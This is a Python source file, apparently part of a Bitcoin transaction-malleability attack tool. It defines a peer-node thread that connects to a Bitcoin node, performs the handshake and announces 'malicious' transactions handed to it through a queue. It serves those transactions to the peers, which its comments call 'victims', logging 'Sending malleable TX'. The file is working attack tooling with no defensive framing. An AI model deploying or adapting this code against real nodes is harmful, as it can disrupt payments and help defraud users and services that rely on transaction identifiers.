# Import dependencies
import socket
import time
import struct
import errno
import bitcoin
import os

from bitcoin.messages import MsgSerializable,  msg_inv, msg_addr, msg_alert, msg_getaddr, msg_tx, msg_version, msg_verack, msg_addr, msg_getdata, msg_ping, msg_pong
from bitcoin.net import CInv
from bitcoin.core import CMutableTransaction
from datetime import datetime
from threading import Thread, current_thread
from queue import Queue, Empty
from custom_log import log, ERROR, INFO, SUCCESS


class BitcoinPublisherNode(Thread):
    def __init__(self, remote_node_ip, remote_node_port, pipe, local_node_ip='127.0.0.1', local_node_port=0, args=(), kwargs=None):
        Thread.__init__(self, args=(), kwargs=None)
        self.daemon = True
        self.pipe = pipe

        self.remote_node_ip = remote_node_ip
        self.remote_node_port = remote_node_port
        self.local_node_ip = local_node_ip
        self.local_node_port = local_node_port
        self.buffer_size = 1024
        self.malicious_txs = {}
        self.queue = {}
        self.thread_name = current_thread().getName()

    def run(self):
        while True:
            try:
                self.serve()
            except:
                pass
            time.sleep(1)

    def connect(self):
        try:
            log('trying to connect %s:%s' %
                (self.remote_node_ip, self.remote_node_port), INFO)
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.settimeout(2)
            s.connect((self.remote_node_ip, self.remote_node_port))
            self.s = s
            s.settimeout(None)
            return True
        except socket.error:
            return False

    def handshake(self):
        # Create Request Objects
        version_message = self.__version_pkt__(
            self.remote_node_ip, self.local_node_ip, self.remote_node_port, self.local_node_port).to_bytes()
        verack_message = msg_verack().to_bytes()
        self.s.send(version_message)
        self.s.send(verack_message)

    def serve(self):
        connected = False
        while not connected:
            connected = self.connect()
            if not connected:
                log('Failed to connect to %s:%s, retrying in 2 seconds...' %
                    (self.remote_node_ip, self.remote_node_port), ERROR)
                time.sleep(2)
        log('connected to %s:%s' %
            (self.remote_node_ip, self.remote_node_port), SUCCESS)
        self.handshake()
        left_over = bytes()
        response_data = bytes()
        while connected:
            time.sleep(0.001)
            try:
                response_data = self.s.recv(
                    self.buffer_size, socket.MSG_DONTWAIT)
            except socket.error as e:
                err = e.args[0]
                if err != errno.EAGAIN and err != errno.EWOULDBLOCK:
                    log("Network Error: %s" % e, ERROR)
                    try:
                        connected = False
                        self.s.close()
                        self.s = None
                    except:
                        pass
                    raise e
            response_data = left_over + response_data
            left_over = self.__callback_recv_msg__(response_data)
            response_data = left_over
            # read pipe messages
            self.read_pipe()
            # send malicious tx hash to victims so that they request me for the tx data
            self.__send_inv_mal_txs__()

    def read_pipe(self):
        while True:
            try:
                msg = self.pipe.get_nowait()
            except Empty:
                # pipe is empty we have not yet received any thing from parent thread
                return
            (tx_hash, tx) = msg
            self.malicious_txs[tx_hash] = tx
            self.queue[tx_hash] = tx

    def __callback_recv_msg__(self, response):
        while True:
            if len(response) < 24:
                return response
            response_header = response[0:24]
            header = struct.unpack('I12sI4s', response_header)

            (packet_magic, command, payload_len, checksum) = header
            if len(response) < 24 + payload_len:
                # response unfinished return it to be buffered
                return response
            response_payload = response[24: 24 + payload_len]
            msgb = response[0: 24 + payload_len]
            msg = MsgSerializable.from_bytes(msgb)
            if isinstance(msg, msg_ping):
                self.__callback_ping__(msg)
            if isinstance(msg, msg_getdata):
                self.__callback_getdata__(msg)
            response = response[24 + payload_len:]

    def __callback_ping__(self, msg):
        nonce = msg.nonce
        pong = msg_pong(nonce=nonce)
        pong_msg = pong.to_bytes()
        self.s.send(pong_msg)

        # Send our ping back
        new_nonce = int.from_bytes(os.urandom(
            8), signed=False, byteorder="big")
        ping = msg_ping(nonce=new_nonce)
        ping_msg = ping.to_bytes()
        self.s.send(ping_msg)

    def __callback_getdata__(self, msg):
        invs = msg.inv
        for inv in invs:
            tx_hash = inv.hash
            if tx_hash in self.malicious_txs:
                tx = self.malicious_txs[tx_hash]
                tx_msg = msg_tx()
                tx_msg.tx = tx
                log('Sending malleable TX: %s' %
                    self.big_2_little_endian(tx_hash).hex(), SUCCESS)
                self.s.send(tx_msg.to_bytes())

    def big_2_little_endian(self, h):
        r = bytearray(h)
        r.reverse()
        return bytes(r)

    def __send_inv_mal_txs__(self):
        invs = []
        for tx_hash in list(self.queue):
            # create inv of type TX to send to victim nodes
            inv = CInv()
            inv.type = 1
            inv.hash = tx_hash
            invs.append(inv)
            del self.queue[tx_hash]

        if(len(invs) == 0):
            return
        inv_msg = self.__inv_pkt__(invs)
        self.s.send(inv_msg.to_bytes())

    def __version_pkt__(self, client_ip, server_ip, server_port, client_port):
        msg = msg_version()
        msg.nVersion = 70002
        msg.addrTo.ip = server_ip
        msg.addrTo.port = server_port
        msg.addrFrom.ip = client_ip
        msg.addrFrom.port = client_port
        return msg

    def __getdata_pkt__(self, invs):
        msg = msg_getdata()
        msg.inv = invs
        return msg

    def __inv_pkt__(self, invs):
        msg = msg_inv()
        msg.inv = invs
        return msg
